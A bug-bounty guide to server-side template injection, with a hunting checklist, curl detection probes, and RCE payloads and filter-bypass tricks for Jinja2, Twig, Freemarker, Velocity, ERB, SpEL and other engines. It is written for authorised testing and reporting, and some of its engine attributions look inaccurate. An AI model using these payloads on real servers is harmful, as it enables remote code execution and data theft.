# Server-Side Template Injection (SSTI)

SSTI occurs when user input is embedded into a server-side template and evaluated by the template engine instead of being escaped. It matters because template engines expose powerful objects (filesystem, runtime, environment), so a trivial arithmetic reflection often escalates to remote code execution. Typical impact is critical: RCE on the server, sensitive data disclosure, or full application compromise.

## Hunting Checklist

1. Find every place input is *rendered back* server-side: search results, error messages, profile fields (name/bio), email/welcome templates, password-reset pages, preview/custom themes, support tickets, and URL paths/query reflected in pages.
2. Submit an arithmetic expression, not just the literal string: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `\${7*7}` — a response containing `49` (or `7*7` unevaluated in one engine and evaluated in another) confirms evaluation.
3. Distinguish SSTI from request reflection (XSS): with SSTI the *server* computes the expression; check the raw response, not the rendered DOM.
4. Fingerprint the engine from error messages and payload behavior (`jinja2.exceptions.UndefinedError`, `Twig_Error`, `freemarker.core...`, `ERB`, `Tornado`, etc.).
5. Once confirmed, escalate stepwise: read config/environment → list object attributes → execute a harmless command (`id`, `whoami`) — stop at proof when scope allows.
6. Test blind SSTI: payloads that trigger out-of-band interaction (template engine calling an external URL/DNS if the payload allows it) or cause delays/errors.
7. Run tplmap against candidate parameters to automate detection/exploitation across engines.
8. Don't forget non-obvious sinks: templates for emails, PDF/report generators, API error handlers, and second-order triggers (stored value rendered later).

## Test Cases & Examples

### Universal detection probes

```bash
curl 'https://target.com/search?q={{7*7}}'
curl 'https://target.com/search?q=${7*7}'
curl 'https://target.com/search?q=<%=+7*7+%>'
curl 'https://target.com/search?q=#[{7*7}]'   # Ruby ERB-style
```

Response containing `49` indicates template evaluation.

### Engine identification

```bash
{{7*7}}          # 49 -> Python (Jinja2/Twisted) or Go
${7*7}           # 49 -> Ruby (ERB), PHP (older templates), Java (Freemarker/SpEL variants)
<%=7*7%>         # 49 -> Ruby ERB / EJS / ASP
#{7*7}           # 49 -> Ruby (interpolation)
{{constructor.constructor('return 7*7')()}}  # JS template engines
```

### Engine-specific proof / RCE payloads (public cheat-sheet staples)

Python — Jinja2:

```bash
{{config}}                                                        # dump config
{{ ''.__class__.__mro__[1].__subclasses__() }}                    # enumerate classes
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}  # pick subprocess.Popen at index X
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

Python — Tornado / Mako-style objects:

```bash
{{request.application.__self__._get_data_for_json.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Twig (PHP):

```bash
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

Smarty (PHP):

```bash
{php}echo `id`;{/php}
{system('id')}
```

Freemarker (Java):

```bash
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

Velocity (Java):

```bash
#set($rt = $rt.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))
$rt.exec("id")
```

Ruby — ERB:

```bash
<%= system("id") %>
<%= `id` %>
```

Java — SpEL / EL:

```bash
${T(java.lang.Runtime).getRuntime().exec('id')}
#{''class.forName('java.lang.Runtime').getMethod('exec', ''.class).invoke('','id')}
```

(Detailed cross-engine table: PortSwigger SSTI knowledge base and PayloadsAllTheThings — links below.)

### Finding the attack vector (mindmap by @what_web)

![SSTI attack vector mindmap](https://pbs.twimg.com/media/EnwZh7qXcAEB3wu?format=jpg&name=large)

Source: https://twitter.com/jae_hak99/status/1331967876417327104?s=20

## Bypass Techniques

- **Keyword blacklist (`|`, `for`, `if`, class names)**: switch engines' equivalent syntax (attribute access vs `|attr()` in Jinja2: `{{''|attr('__class__')}}`), string concatenation (`'cl'+'ass'`), hex/unicode escapes.
- **`.` filtered**: Jinja2 bracket syntax — `request['application']['__self__']`.
- **`_` filtered**: string building — `{{()|attr('\x5f\x5fclass\x5f\x5f')}}` or `attr(''.__class__)` alternatives via `|attr(config)` style tricks.
- **Sandboxed environments**: use allowed dunder chains via registered globals/callables (`cycler`, `lipsum`, `__builtins__`) — the `cycler.__init__.__globals__.os.popen` chain is the standard non-filter route.
- **Blind / no reflection**: trigger computation whose only observable is timing, errors, or OOB lookup (e.g., payload that makes the engine resolve a URL you control).
- **WAF/character filters**: URL encode the probe, split payloads across multiple params if concatenated, or comment syntax supported by the template.

## Tools & Resources

- tplmap: https://github.com/epinna/tplmap
- PortSwigger SSTI labs & article: https://portswigger.net/web-security/server-side-template-injection
- PayloadsAllTheThings — SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- Justin Steven's template injection for pentesters: https://portswigger.net/research/server-side-template-injection
- HackerOne SSTI hacktivity search: https://hackerone.com/hacktivity?order_field=popular&filter=type%3Apublic&querystring=SSTI

## Report Tips

- Show the arithmetic reflection (`49`) first, then the engine identified, then a *non-destructive* RCE proof (`id`/`whoami` output) — this ordering makes triage severity obvious.
- State whether the injection point is unauthenticated and whether the template sink is shared (e.g., email templates rendered for other users) — both push toward critical.
- Never dump full environment/config secrets in the report; mask values and note that secrets were readable.

---
*Author: [0xsunil](https://twitter.com/0xsunil)*
